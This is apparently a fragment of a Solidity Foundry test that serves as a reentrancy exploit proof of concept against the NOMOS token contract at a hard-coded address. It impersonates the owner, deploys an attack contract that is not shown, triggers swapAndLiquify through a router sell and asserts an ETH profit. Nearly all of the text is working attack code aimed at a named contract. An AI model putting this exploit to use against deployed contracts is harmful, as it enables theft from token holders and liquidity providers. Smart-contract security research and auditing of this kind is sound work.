    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    ReentrancyAttack public attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get tokens and prepare the attack
        vm.startPrank(attacker);

        // First, we need to get some NOMOS tokens to initiate the attack
        // The contract has total supply owned by deployer initially
        // We need to impersonate the owner to get tokens or buy from DEX
        address owner = NOMOS(TARGET).owner();
        vm.startPrank(owner);

        // Enable swapAndLiquify if not already enabled
        NOMOS(TARGET).setSwapAndLiquifyEnabled(true);

        // Exclude attacker from fees to avoid complications
        NOMOS(TARGET).excludeFromFee(attacker);

        // Transfer some tokens to attacker to start
        uint256 initialTokens = 100000000 * 10**11; // Within maxTxAmount
        NOMOS(TARGET).transfer(attacker, initialTokens);
        vm.stopPrank();

        // Deploy malicious contract
        attackContract = new ReentrancyAttack(TARGET);

        // Transfer tokens to attack contract
        NOMOS(TARGET).transfer(address(attackContract), initialTokens / 2);

        // Approve token spending for attack contract
        vm.startPrank(address(attackContract));
        NOMOS(TARGET).approve(TARGET, type(uint256).max);
        NOMOS(TARGET).approve(NOMOS(TARGET).uniswapV2Router(), type(uint256).max);
        vm.stopPrank();

        // Need to accumulate tokens in the contract to trigger swapAndLiquify
        // Make some transfers to accumulate fees in the contract
        uint256 transferAmount = 50000000 * 10**11;
        for (uint i = 0; i < 5; i++) {
            vm.prank(attacker);
            NOMOS(TARGET).transfer(address(uint160(uint256(keccak256(abi.encodePacked(i))))), transferAmount);
        }

        // Check contract token balance
        uint256 contractBalance = NOMOS(TARGET).balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);
        console.log("Minimum tokens before swap:", NOMOS(TARGET).minimumTokensBeforeSwapAmount());
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Start the attack
        vm.startPrank(address(attackContract));

        // First, we need to trigger swapAndLiquify by selling tokens to the pair
        // This requires the contract to have accumulated enough tokens (>= minimumTokensBeforeSwap)
        // And swapAndLiquifyEnabled must be true

        // Get the pair address
        address pair = NOMOS(TARGET).uniswapV2Pair();

        // Check if we have enough tokens in contract to trigger swapAndLiquify
        uint256 contractTokenBalance = NOMOS(TARGET).balanceOf(TARGET);
        uint256 minimumTokens = NOMOS(TARGET).minimumTokensBeforeSwapAmount();

        if (contractTokenBalance >= minimumTokens) {
            console.log("Contract has enough tokens to trigger swapAndLiquify");

            // Record initial ETH balance of attack contract
            uint256 initialETH = address(attackContract).balance;
            console.log("Initial ETH balance:", initialETH);

            // Trigger swapAndLiquify by selling tokens to the pair
            // The attack contract's receive() function will be called during addLiquidity
            // and will re-enter swapAndLiquify

            // We need to sell tokens to the pair to trigger the swapAndLiquify
            // The contract triggers swapAndLiquify when selling to the pair
            // and contract balance >= minimumTokensBeforeSwap

            // First, approve router if needed
            IUniswapV2Router02 router = IUniswapV2Router02(NOMOS(TARGET).uniswapV2Router());

            // Sell a small amount to trigger swapAndLiquify
            uint256 sellAmount = 1000000 * 10**11;

            // Set up path for selling
            address[] memory path = new address[](2);
            path[0] = TARGET;
            path[1] = router.WETH();

            // Perform the swap - this should trigger swapAndLiquify
            // and our receive() function will be called
            try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount,
                0,
                path,
                address(attackContract),
                block.timestamp
            ) {
                console.log("Swap executed successfully");
            } catch Error(string memory reason) {
                console.log("Swap failed:", reason);
            }

            // Check final ETH balance
            uint256 finalETH = address(attackContract).balance;
            console.log("Final ETH balance:", finalETH);
            console.log("ETH profit:", finalETH - initialETH);

            // Transfer ETH back to attacker
            if (finalETH > initialETH) {
                (bool success, ) = attacker.call{value: finalETH - initialETH}("");
                require(success, "ETH transfer failed");
            }
        } else {
            console.log("Contract does not have enough tokens to trigger swapAndLiquify");
            console.log("Contract balance:", contractTokenBalance);
            console.log("Minimum required:", minimumTokens);

            // Try to accumulate more tokens in contract by making transfers with fees
            // We need to trigger fees that go to the contract
            uint256 accumulateAmount = minimumTokens - contractTokenBalance + 1000000 * 10**11;
            console.log("Need to accumulate approximately:", accumulateAmount);

            // Make transfers to accumulate fees
            // This is a fallback if contract doesn't have enough tokens initially
            vm.stopPrank();
            vm.startPrank(attacker);

            // Transfer to different addresses to accumulate fees
            uint256 transferAmt = 20000000 * 10**11;
            for (uint i = 0; i < 10; i++) {
                NOMOS(TARGET).transfer(address(uint160(uint256(keccak256(abi.encodePacked(i))))), transferAmt);
            }

            // Try again
            vm.stopPrank();
            vm.startPrank(address(attackContract));

            // Check new balance
            contractTokenBalance = NOMOS(TARGET).balanceOf(TARGET);
            console.log("New contract balance:", contractTokenBalance);

            if (contractTokenBalance >= minimumTokens) {
                // Now trigger the attack
                // Similar swap as above
                IUniswapV2Router02 router = IUniswapV2Router02(NOMOS(TARGET).uniswapV2Router());
                uint256 sellAmount = 1000000 * 10**11;

                address[] memory path = new address[](2);
                path[0] = TARGET;
                path[1] = router.WETH();

                uint256 initialETH = address(attackContract).balance;

                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    sellAmount,
                    0,
                    path,
                    address(attackContract),
                    block.timestamp
                );

                uint256 finalETH = address(attackContract).balance;
                console.log("ETH profit after accumulation:", finalETH - initialETH);

                if (finalETH > initialETH) {
                    (bool success, ) = attacker.call{value: finalETH - initialETH}("");
                    require(success, "ETH transfer failed");
                }
            }
        }

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

